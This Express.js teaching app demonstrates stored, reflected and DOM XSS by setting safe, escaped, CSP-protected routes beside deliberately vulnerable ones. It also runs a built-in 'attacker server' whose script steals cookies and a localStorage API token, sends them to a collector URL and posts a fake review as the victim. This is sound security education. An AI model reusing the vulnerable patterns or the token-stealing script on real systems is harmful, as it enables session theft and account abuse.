const express = require("express");
const crypto = require("crypto");

const PORT = Number(process.env.PORT) || 3000;
// The attacker's server runs from this same file on the next port: it hosts the evil script and collects loot
const ATTACKER_PORT = PORT + 1;
const BASE_URL = `http://localhost:${PORT}`;
const ATTACKER_URL = `http://127.0.0.1:${ATTACKER_PORT}`;
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000; // 7 days

// ---------- "Database" ----------
// shortcut: in-memory Maps, lost on restart. A real app uses database tables.
const users = new Map();     // email -> { email, salt, passwordHash }
const sessions = new Map();  // sha256(sid) -> { email, expiresAt }       (HttpOnly cookie)
const apiTokens = new Map(); // sha256(token) -> { email }                 (the frontend puts this in localStorage: the BAD habit)
const reviews = [];          // { id, author, text, website, at }   stored RAW: we escape when we OUTPUT, not when we save

// ---------- Helpers ----------
const sha256 = (value) => crypto.createHash("sha256").update(value).digest("hex");
const randomToken = () => crypto.randomBytes(32).toString("base64url");
const str = (v) => (typeof v === "string" ? v : undefined);
const parseCookies = (req) => Object.fromEntries((req.headers.cookie ?? "").split(";").filter((c) => c.includes("="))
  .map((c) => [c.slice(0, c.indexOf("=")).trim(), c.slice(c.indexOf("=") + 1).trim()]));

// DEFENSE 1: escape for the HTML context. These 5 characters are all it takes to break out of text or a quoted attribute.
const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
// DEFENSE 2: URLs need their own check. Escaping doesn't stop href="javascript:alert(1)", so allow only http(s).
const safeUrl = (u) => {
  try { const url = new URL(u); return url.protocol === "http:" || url.protocol === "https:" ? url.href : null; } catch { return null; }
};

const DUMMY_SALT = crypto.randomBytes(16);
// shortcut: test accounts with known passwords. A real app has a signup (topic 06).
for (const [email, password] of [["rahul@mail.com", "chai-and-code-42"], ["vikram@mail.com", "vikram-pass-99"]]) {
  const salt = crypto.randomBytes(16);
  users.set(email, { email, salt, passwordHash: crypto.scryptSync(password, salt, 64) });
}

// shortcut: no Secure flag because the demo runs on http://localhost. In production add `secure: true` (topic 10).
const COOKIE = { httpOnly: true, sameSite: "lax", path: "/" }; // DEFENSE 4: HttpOnly, so document.cookie can't see it

function getSessionEmail(req) {
  const sid = parseCookies(req).sid;
  const s = sid && sessions.get(sha256(sid));
  return s && Date.now() <= s.expiresAt ? s.email : null;
}

// `nonce` is set only on protected pages: it allow-lists OUR <script>/<style> tags under the CSP
const page = (title, body, nonce) => `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>${esc(title)}</title>
<style${nonce ? ` nonce="${nonce}"` : ""}>body{font-family:system-ui,sans-serif;max-width:600px;margin:48px auto;padding:0 16px;line-height:1.5}
input,button,textarea{font:inherit;padding:8px 12px}input,textarea{width:100%;box-sizing:border-box;margin:6px 0}
.bad{background:#fee2e2;border:1px solid #dc2626;padding:4px 8px;border-radius:6px}</style></head>
<body><h1>🍛 KhaanaReview</h1>${body}<p><a href="/">Home</a></p></body></html>`;

// ---------- App ----------
const app = express();
app.use(express.json({ limit: "10kb" }));
app.use(express.urlencoded({ extended: false, limit: "10kb" }));
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  res.set("X-Content-Type-Options", "nosniff"); // don't let the browser guess "this text file is HTML"
  if (req.path.startsWith("/vulnerable/")) return next(); // ❌ the vulnerable pages get no CSP, so you can see XSS work

  // DEFENSE 3: Content-Security-Policy. Only <script> tags carrying THIS response's random nonce may run.
  // An injected <script>, <img onerror=…> or javascript: link has no nonce, so the browser refuses it.
  // img-src/connect-src 'self' also stop a script from sending loot to another server.
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.set("Content-Security-Policy", [
    "default-src 'self'",
    `script-src 'nonce-${res.locals.nonce}'`,
    `style-src 'nonce-${res.locals.nonce}'`,
    "img-src 'self'",
    "connect-src 'self'",
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join("; "));
  next();
});

// Home: log in, or write a review
app.get("/", (req, res) => {
  const nonce = res.locals.nonce;
  const email = getSessionEmail(req);
  if (!email) {
    return res.send(page("Log in", `<form id="login">
<input name="email" type="email" value="rahul@mail.com" autocomplete="username">
<input name="password" type="password" placeholder="Password" autocomplete="current-password">
<button>Log in</button></form><p id="out"></p>
<p>Test accounts: <b>rahul@mail.com</b> / <b>chai-and-code-42</b>, <b>vikram@mail.com</b> / <b>vikram-pass-99</b></p>
<script nonce="${nonce}">
document.getElementById("login").onsubmit = async (e) => {
  e.preventDefault();
  const f = e.target;
  const r = await fetch("/login", { method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: f.email.value, password: f.password.value }) });
  const data = await r.json();
  if (!r.ok) return (document.getElementById("out").textContent = data.error);
  // ❌ The bad habit from topic 25: a long-lived API token in localStorage. Any script on this origin can read it.
  localStorage.setItem("apiToken", data.apiToken);
  location.reload();
};
</script>`, nonce));
  }
  res.send(page("KhaanaReview", `<p>Signed in as <b>${esc(email)}</b>. API token in localStorage: <code id="tok"></code></p>
<h2>Write a review</h2>
<form method="post" action="/reviews"><textarea name="text" rows="3" placeholder="How was the food?"></textarea>
<input name="website" placeholder="Restaurant website (optional)"><button>Post</button></form>
<h2>Read reviews</h2><ul>
<li><a href="/reviews">/reviews</a>: escaped + CSP ✅</li>
<li><a href="/csp-demo/reviews">/csp-demo/reviews</a>: NOT escaped (a bug), but CSP still blocks the script 🛡️</li>
<li><a href="/vulnerable/reviews">/vulnerable/reviews</a>: not escaped, no CSP ❌</li>
<li><a href="/search?q=biryani">/search</a> vs <a href="/vulnerable/search?q=biryani">/vulnerable/search</a> (reflected XSS)</li>
<li><a href="/welcome#Rahul">/welcome#Rahul</a> vs <a href="/vulnerable/welcome#Rahul">/vulnerable/welcome#Rahul</a> (DOM XSS)</li></ul>
<form method="post" action="/logout"><button>Log out</button></form>
<script nonce="${nonce}">document.getElementById("tok").textContent = (localStorage.getItem("apiToken") ?? "none").slice(0, 10) + "…";</script>`, nonce));
});

app.post("/login", (req, res) => {
  const email = str(req.body?.email)?.trim().toLowerCase();
  const user = email ? users.get(email) : undefined;
  // Hash even for unknown emails so the response time doesn't reveal who has an account (topic 51)
  const hash = crypto.scryptSync(str(req.body?.password) ?? "", user?.salt ?? DUMMY_SALT, 64);
  if (!user || !crypto.timingSafeEqual(hash, user.passwordHash)) return res.status(401).json({ error: "Wrong email or password" });

  const sid = randomToken();
  sessions.set(sha256(sid), { email: user.email, expiresAt: Date.now() + SESSION_TTL_MS });
  res.cookie("sid", sid, { ...COOKIE, maxAge: SESSION_TTL_MS }); // ✅ HttpOnly: invisible to JavaScript
  const apiToken = randomToken();
  apiTokens.set(sha256(apiToken), { email: user.email });
  // ❌ A token in the JSON body is readable by JavaScript, and the page stores it in localStorage (to show the theft)
  res.json({ message: `Logged in as ${user.email}`, apiToken });
});

// The API accepts the session cookie OR a Bearer token. A stolen Bearer token works from ANY computer.
app.get("/api/me", (req, res) => {
  const bearer = req.get("authorization")?.match(/^Bearer (\S+)$/)?.[1];
  const email = bearer ? apiTokens.get(sha256(bearer))?.email : getSessionEmail(req);
  if (!email) return res.status(401).json({ error: "Not signed in" });
  res.json({ email, via: bearer ? "Bearer token" : "session cookie", myReviews: reviews.filter((r) => r.author === email).length });
});

app.post("/reviews", (req, res) => {
  const email = getSessionEmail(req);
  if (!email) return res.status(401).json({ error: "Not signed in" });
  const origin = req.get("origin");
  if (origin && origin !== BASE_URL) return res.status(403).json({ error: "Cross-site request refused" }); // CSRF (topic 47)
  const text = str(req.body?.text)?.trim();
  const website = str(req.body?.website)?.trim() || null;
  if (!text || text.length > 500) return res.status(400).json({ error: "Review text must be 1 to 500 characters" });
  if (website && website.length > 200) return res.status(400).json({ error: "Website is too long" });
  // We save it exactly as typed. Escaping happens at OUTPUT time, for the context it lands in (HTML, attribute, URL, JS).
  // shortcut: a real app would also reject a non-http(s) website here (validate input AND escape output).
  const review = { id: reviews.length + 1, author: email, text, website, at: new Date().toISOString() };
  reviews.push(review);
  if (req.accepts(["json", "html"]) === "html") return res.redirect(303, "/reviews");
  res.status(201).json(review);
});

// ✅ SAFE: every value escaped for its context, links checked, plus the CSP header from the middleware
app.get("/reviews", (req, res) => {
  const items = reviews.map((r) => {
    const url = r.website && safeUrl(r.website);
    return `<li><b>${esc(r.author)}</b>: ${esc(r.text)}${url ? ` <a href="${esc(url)}" rel="nofollow noopener">website</a>` : ""}</li>`;
  }).join("");
  res.send(page("Reviews", `<h2>Reviews ✅</h2><ul>${items || "<li>None yet</li>"}</ul>`, res.locals.nonce));
});

// 🛡️ A BUG (no escaping) on a page that still has the CSP: the injected script is refused by the browser
app.get("/csp-demo/reviews", (req, res) => {
  const items = reviews.map((r) => `<li><b>${r.author}</b>: ${r.text}</li>`).join("");
  res.send(page("Reviews (CSP demo)", `<h2>Reviews: forgot to escape, but CSP is on 🛡️</h2><ul>${items}</ul>`, res.locals.nonce));
});

// ❌ VULNERABLE: stored XSS. Whatever anyone typed becomes part of the page's HTML.
app.get("/vulnerable/reviews", (req, res) => {
  const items = reviews.map((r) => `<li><b>${r.author}</b>: ${r.text}${r.website ? ` <a href="${r.website}">website</a>` : ""}</li>`).join("");
  res.send(page("Reviews (vulnerable)", `<h2 class="bad">Reviews: no escaping, no CSP ❌</h2><ul>${items}</ul>`));
});

// Reflected XSS: the search term comes back in the page
app.get("/search", (req, res) => {
  const q = str(req.query.q) ?? "";
  const hits = reviews.filter((r) => r.text.toLowerCase().includes(q.toLowerCase()));
  res.send(page("Search", `<p>${hits.length} result(s) for <b>${esc(q)}</b></p>`, res.locals.nonce));
});
app.get("/vulnerable/search", (req, res) => {
  const q = str(req.query.q) ?? "";
  const hits = reviews.filter((r) => r.text.toLowerCase().includes(q.toLowerCase()));
  res.send(page("Search (vulnerable)", `<p class="bad">${hits.length} result(s) for <b>${q}</b></p>`));
});

// DOM XSS: the server sends the same page every time. The bug is in the page's OWN JavaScript (innerHTML).
app.get("/welcome", (req, res) => {
  const nonce = res.locals.nonce;
  res.send(page("Welcome", `<p id="hi"></p>
<script nonce="${nonce}">document.getElementById("hi").textContent = "Welcome, " + decodeURIComponent(location.hash.slice(1));</script>`, nonce));
});
app.get("/vulnerable/welcome", (req, res) => {
  res.send(page("Welcome (vulnerable)", `<p id="hi" class="bad"></p>
<script>document.getElementById("hi").innerHTML = "Welcome, " + decodeURIComponent(location.hash.slice(1));</script>`));
});

app.post("/logout", (req, res) => {
  const sid = parseCookies(req).sid;
  const email = getSessionEmail(req);
  if (sid) sessions.delete(sha256(sid));
  // Revoke this user's API tokens too: a token copied out of localStorage stops working NOW, not "when it expires"
  if (email) for (const [k, t] of apiTokens) if (t.email === email) apiTokens.delete(k);
  res.clearCookie("sid", COOKIE);
  if (req.accepts(["json", "html"]) === "html") return res.redirect(303, "/");
  res.json({ message: "Logged out, API tokens revoked" });
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// Errors (bad JSON, body too big, bugs) come here. Never send the stack trace to the client.
app.use((err, req, res, next) => {
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Body must be valid JSON" });
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Request body too large" });
  console.error(err);
  res.status(500).json({ error: "Something went wrong" });
});

app.listen(PORT, () => console.log(`🍛 KhaanaReview on ${BASE_URL}  ← open this one`));

// ---------- The attacker's server ----------
// Vikram hosts his script here and collects whatever it steals.
const loot = [];
const evil = express();

// The script Vikram injects with <script src="…/x.js">. It runs with the VICTIM's page, cookies and storage.
evil.get("/x.js", (req, res) => {
  res.type("application/javascript").send(`(async () => {
  const data = { page: location.href, documentCookie: document.cookie, apiToken: localStorage.getItem("apiToken") };
  // Send the loot home. An <img> request needs no CORS permission.
  new Image().src = "${ATTACKER_URL}/collect?d=" + encodeURIComponent(JSON.stringify(data));
  // HttpOnly hid the session cookie, but this script can still USE it: same-origin requests carry it automatically
  await fetch("/reviews", { method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ text: "Vikram's Biryani House is the best in Hyderabad! 5 stars" }) });
})();`);
});

evil.get("/collect", (req, res) => {
  const d = str(req.query.d) ?? "";
  loot.push({ at: new Date().toISOString(), data: d.slice(0, 2000) });
  console.log(`🕵️  Stolen: ${d.slice(0, 300)}`);
  res.status(204).end();
});

evil.get("/loot", (req, res) => res.json(loot)); // so you can see what was stolen
evil.use((req, res) => res.status(404).send("Not found"));
evil.listen(ATTACKER_PORT, () => console.log(`😈 Attacker server on ${ATTACKER_URL} (script: /x.js, stolen data: /loot)`));

setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now > s.expiresAt) sessions.delete(k);
}, 60_000).unref();
